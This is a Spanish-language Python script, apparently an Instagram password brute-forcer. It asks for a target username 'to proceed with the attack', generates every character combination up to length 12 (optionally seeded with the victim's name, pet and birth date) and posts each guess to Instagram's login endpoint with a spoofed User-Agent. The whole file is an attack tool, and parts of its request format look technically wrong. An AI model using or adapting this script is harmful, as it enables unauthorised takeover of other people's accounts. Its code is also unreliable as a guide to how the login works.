import itertools
import string
import requests
import time
import hashlib


def probar_contraseña(usuario, contraseña):
    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'X-CSRFToken': 'missing',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.instagram.com/accounts/login/',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'username': usuario,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{hashlib.sha256(contraseña.encode()).hexdigest()}',
        'queryParams': '{}',
        'optIntoOneTap': 'false'
    }
    response = requests.post(url, headers=headers, data=data)
    return response.json().get('authenticated')


def generar_y_probar_contraseñas(usuario, archivo_salida, caracteres):
    with open(archivo_salida, 'w') as f:
        for longitud in range(1, 13):  
            for combinacion in itertools.product(caracteres, repeat=longitud):
                contraseña = ''.join(combinacion)
                f.write(contraseña + '\n')  
                if probar_contraseña(usuario, contraseña):
                    print(f'Contraseña encontrada: {contraseña}')
                    return
                print(f'Probando: {contraseña}')


def obtener_informacion_personal():
    nombre = input("Introduce tu nombre: ")
    apellidos = input("Introduce tus apellidos: ")
    edad = input("Introduce tu edad: ")
    nombre_mascota = input("Introduce el nombre de tu mascota: ")
    fecha_nacimiento = input("Introduce tu fecha de nacimiento (DD/MM/AAAA): ")
    return nombre, apellidos, edad, nombre_mascota, fecha_nacimiento


def generar_caracteres_informacion_personal(informacion_personal):
    caracteres = string.ascii_letters + string.digits + string.punctuation + 'ñÑ' 
    for info in informacion_personal:
        caracteres += info
    return caracteres


def menu():
    print("Elige una opción:")
    print("1. Ataque de fuerza bruta automático")
    print("2. Generar contraseñas a partir de información personal")
    opcion = input("Introduce el número de la opción deseada: ")
    return opcion

# Usuario de Instagram



usuario = input("Escoja su usuario para proceder al ataque...")


archivo_salida = 'combinaciones.txt'


opcion = menu()

if opcion == '1':

    caracteres = string.ascii_letters + string.digits + string.punctuation + 'ñÑ' 
    generar_y_probar_contraseñas(usuario, archivo_salida, caracteres)
elif opcion == '2':

    informacion_personal = obtener_informacion_personal()
    caracteres = generar_caracteres_informacion_personal(informacion_personal)
    generar_y_probar_contraseñas(usuario, archivo_salida, caracteres)
else:
    print("Opción no válida. Saliendo del programa.")
